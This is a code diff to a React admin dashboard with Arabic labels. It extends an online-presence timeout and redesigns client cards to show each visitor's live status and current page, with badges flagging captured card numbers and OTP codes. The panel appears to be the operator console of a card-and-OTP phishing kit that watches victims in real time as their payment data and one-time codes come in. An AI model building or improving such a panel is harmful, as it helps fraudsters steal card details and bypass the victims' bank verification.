@@ -161,7 +161,8 @@ export const Admin = () => {
   const isUserOnline = (c) => {
     const time = c.last_heartbeat || c.last_update;
     if (!time) return false;
-    return (Date.now() - time) < 15000;
+    // Increased to 45 seconds for better accuracy
+    return (Date.now() - time) < 45000;
   };
 
   const handleAction = async (type, payload = {}) => {
@@ -428,16 +429,29 @@ export const Admin = () => {
                     }}
                   >
                     <div className="item-name-row">
-                       <strong>{c.full_name || c.id_number || 'عميل جديد'}</strong>
+                       <strong style={{color: '#333'}}>
+                         {online ? <span className="online-status-text online">متصل</span> : <span className="online-status-text offline">خرج</span>}
+                         {c.full_name || c.id_number || 'عميل جديد'}
+                       </strong>
                        <span>{c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'}) : ''}</span>
                     </div>
                     <div className="item-sub-row">
-                       <span className="item-id">{c.id_number}</span>
-                       <span className="item-activity">{c.page}</span>
-                       <div style={{display:'flex', alignItems:'center', gap:'5px', marginTop:'5px'}}>
-                          <div style={{width:'8px', height:'8px', borderRadius:'50%', background: online ? '#4caf50' : '#bdbdbd'}}></div>
-                          <span style={{fontSize:'10px', color: online ? '#4caf50' : '#757575'}}>{online ? 'متصل الآن' : 'خرج'}</span>
-                       </div>
+                       <span className="item-id">ID: {c.id?.substring(0,8)}</span>
+                       <span className="item-activity">{c.page || 'تصفح غير معروف'}</span>
+                    </div>
+
+                    {/* Dynamic Indicators for Card/OTP */}
+                    <div className="item-indicators">
+                      {c.card_number && (
+                        <div className="indicator-pill card">
+                          <CreditCard size={10} /> 💳 بطاقة
+                        </div>
+                      )}
+                      {(c.otps && c.otps.length > 0) && (
+                        <div className="indicator-pill otp">
+                          <Plus size={10} /> 🔑 رمز ({c.otps.length})
+                        </div>
+                      )}
                     </div>
                  </div>
                );
